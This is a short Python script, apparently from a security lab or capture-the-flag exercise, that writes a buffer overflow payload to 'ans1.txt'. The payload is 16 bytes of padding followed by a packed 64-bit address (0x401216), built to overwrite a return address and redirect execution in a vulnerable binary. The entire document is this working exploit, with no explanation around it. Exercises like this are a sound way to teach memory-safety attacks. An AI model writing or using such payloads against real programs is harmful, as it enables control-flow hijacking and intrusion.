import struct
padding = b'A' * 16
target_addr = 0x401216
payload = padding + struct.pack('<Q', target_addr)
with open("ans1.txt", "wb") as f:
    f.write(payload)
